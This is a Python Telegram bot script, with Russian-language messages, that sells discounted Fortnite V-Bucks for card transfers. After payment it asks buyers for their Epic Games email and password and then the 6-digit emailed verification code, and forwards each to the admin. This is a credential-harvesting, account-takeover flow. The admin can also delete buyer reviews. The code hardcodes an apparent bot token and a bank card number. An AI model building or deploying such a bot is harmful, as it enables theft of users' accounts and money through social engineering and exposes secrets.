import telebot
from telebot import types
from keep_alive import keep_alive
import json

bot = telebot.TeleBot('7648138016:AAEiFWonFA_E9_qhIGCOPE3xb-KptvxVfko')  # Замените на свой токен
ADMIN_ID = 5263048623  # Замените на ваш ID
user_states = {}

FEEDBACK_FILE = "feedbacks.json"

# Загрузка отзывов при старте бота
try:
    with open(FEEDBACK_FILE, "r", encoding="utf-8") as f:
        feedbacks = json.load(f)
except FileNotFoundError:
    feedbacks = {}

# Функция сохранения отзывов
def save_feedbacks_to_file():
    with open(FEEDBACK_FILE, "w", encoding="utf-8") as f:
        json.dump(feedbacks, f, ensure_ascii=False, indent=4)

prices = {
    "1000 V-Bucks": 600,
    "2000 V-Bucks": 1100,
    "2800 V-Bucks": 1350,
    "3000 V-Bucks": 1450,
    "3800 V-Bucks": 1700,
    "4000 V-Bucks": 1850,
    "4800 V-Bucks": 2100,
    "5000 V-Bucks": 2250,
    "5800 V-Bucks": 2500,
    "6000 V-Bucks": 2650,
    "6800 V-Bucks": 2900,
    "7000 V-Bucks": 3300,
    "7800 V-Bucks": 3500,
    "8000 V-Bucks": 3600,
    "8800 V-Bucks": 3800,
    "9000 V-Bucks": 4000,
    "9800 V-Bucks": 4200,
    "10000 V-Bucks": 4400,
    "10800 V-Bucks": 4600,
    "11000 V-Bucks": 4800,
    "11800 V-Bucks": 5000,
    "12000 V-Bucks": 5200,
    "12800 V-Bucks": 5400,
    "13000 V-Bucks": 5600,
    "13500 V-Bucks": 5800,
    "27000 V-Bucks": 10500,
    "40500 V-Bucks": 14500,
    "54000 V-Bucks": 18500,
    "108000 V-Bucks": 36500
}

def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("/start", "Отзывы")
    for item in prices:
        markup.add(item)
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Привет! Выбери количество V-Bucks или посмотри отзывы.", reply_markup=main_menu())

@bot.message_handler(func=lambda m: m.text in prices)
def handle_selection(message):
    amount = message.text
    price = prices[amount]
    bot.send_message(message.chat.id, f"{amount} стоит {price}₽.\nОплата по номеру карты: 2200700536853491\nПосле, отправьте скрин оплаты.")

@bot.message_handler(content_types=['photo'])
def handle_payment_photo(message):
    bot.send_message(message.chat.id, "Скрин получен. Теперь отправьте почту и пароль от аккаунта Epic Games.")
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    user_states[message.from_user.id] = "waiting_credentials"

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "waiting_credentials")
def handle_credentials(message):
    bot.send_message(message.chat.id, "Спасибо! Ваши данные отправлены администратору.")
    bot.send_message(ADMIN_ID, f"Данные от @{message.from_user.username or 'Без ника'}: {message.text}")

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Запросить 6-значный код", callback_data=f"request_code_{message.from_user.id}"))
    bot.send_message(ADMIN_ID, "Нажмите, чтобы запросить 6-значный код у пользователя:", reply_markup=markup)

    user_states[message.from_user.id] = "waiting_code_request"

@bot.callback_query_handler(func=lambda call: call.data.startswith("request_code_"))
def request_code_from_user(call):
    if call.from_user.id != ADMIN_ID:
        return
    user_id = int(call.data.split("_")[2])
    bot.send_message(user_id, "Вам пришёл запрос: введите 6-значный код, который пришёл на почту.")
    user_states[user_id] = "waiting_code"

@bot.message_handler(func=lambda m: m.text.isdigit() and len(m.text) == 6 and user_states.get(m.from_user.id) == "waiting_code")
def receive_user_code(message):
    bot.send_message(message.chat.id, "Код получен. Ожидайте выполнения заказа.")
    bot.send_message(ADMIN_ID, f"6-значный код от @{message.from_user.username or 'Без ника'}: {message.text}")

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Выполнил заказ ✅", callback_data=f"done_{message.from_user.id}"))
    bot.send_message(ADMIN_ID, "Нажмите, когда выполните заказ:", reply_markup=markup)

    user_states[message.from_user.id] = "code_received"

@bot.callback_query_handler(func=lambda call: call.data.startswith("done_"))
def send_confirm_button(call):
    if call.from_user.id != ADMIN_ID:
        return
    user_id = int(call.data.split("_")[1])
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Подтвердить выполнение заказа ✅", callback_data=f"confirm_{user_id}"))
    bot.send_message(user_id, "Ваш заказ выполнен! Подтвердите выполнение заказа.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_"))
def confirm_delivery(call):
    user_id = int(call.data.split("_")[1])
    if call.from_user.id != user_id:
        return
    bot.send_message(user_id, "Спасибо за покупку! Пожалуйста, оставьте свой отзыв.")
    user_states[user_id] = "awaiting_feedback"

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "awaiting_feedback")
def save_feedback(message):
    feedbacks[str(message.from_user.id)] = {
        "username": message.from_user.username or "Без ника",
        "text": message.text
    }
    save_feedbacks_to_file()
    bot.send_message(message.chat.id, "Спасибо за отзыв!")
    user_states[message.from_user.id] = None

# Кнопка "Отзывы" с возможностью написать отзыв
@bot.message_handler(func=lambda m: m.text == "Отзывы")
def show_reviews(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📝 Написать отзыв", callback_data=f"write_feedback_{message.from_user.id}"))

    if not feedbacks:
        bot.send_message(message.chat.id, "Пока нет отзывов.", reply_markup=markup)
    else:
        text = "\n\n".join([f"От @{f['username']}:\n{f['text']}" for f in feedbacks.values()])
        bot.send_message(message.chat.id, text, reply_markup=markup)

    # Если админ — кнопки для удаления отзывов
    if message.from_user.id == ADMIN_ID:
        admin_markup = types.InlineKeyboardMarkup()
        for uid, f in feedbacks.items():
            admin_markup.add(types.InlineKeyboardButton(f"Удалить отзыв от @{f['username']}", callback_data=f"del_{uid}"))
        bot.send_message(message.chat.id, "Удаление отзывов:", reply_markup=admin_markup)

# Нажатие кнопки "Написать отзыв"
@bot.callback_query_handler(func=lambda call: call.data.startswith("write_feedback_"))
def write_feedback(call):
    user_id = int(call.data.split("_")[2])
    if call.from_user.id != user_id:
        return
    bot.send_message(user_id, "Пожалуйста, напишите свой отзыв:")
    user_states[user_id] = "awaiting_feedback"

@bot.callback_query_handler(func=lambda call: call.data.startswith("del_"))
def delete_review(call):
    if call.from_user.id != ADMIN_ID:
        return
    user_id = call.data.split("_")[1]
    if feedbacks.pop(user_id, None):
        save_feedbacks_to_file()
        bot.send_message(call.message.chat.id, "Отзыв удалён.")
    else:
        bot.send_message(call.message.chat.id, "Отзыв не найден.")

# Запуск keep_alive
keep_alive()
bot.polling(none_stop=True)
